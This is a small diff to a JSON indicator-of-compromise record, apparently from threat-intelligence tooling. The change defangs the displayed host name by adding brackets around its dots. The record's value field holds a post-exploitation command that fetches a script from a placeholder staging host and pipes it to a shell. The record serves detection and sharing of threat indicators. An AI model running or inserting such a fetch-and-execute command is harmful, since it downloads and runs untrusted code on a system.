@@ -2,7 +2,7 @@
   "ioc_id": "ioc_e1b6ef4d11ffdcc323747f8c",
   "type": "cmdline",
   "value": "sh -c 'curl -s http://stage2.example.invalid/m.sh | sh'",
-  "display": "sh -c 'curl -s hxxp://stage2.example.invalid/m.sh | sh'",
+  "display": "sh -c 'curl -s hxxp://stage2[.]example[.]invalid/m.sh | sh'",
   "roles": [
     "post_exploit"
   ],
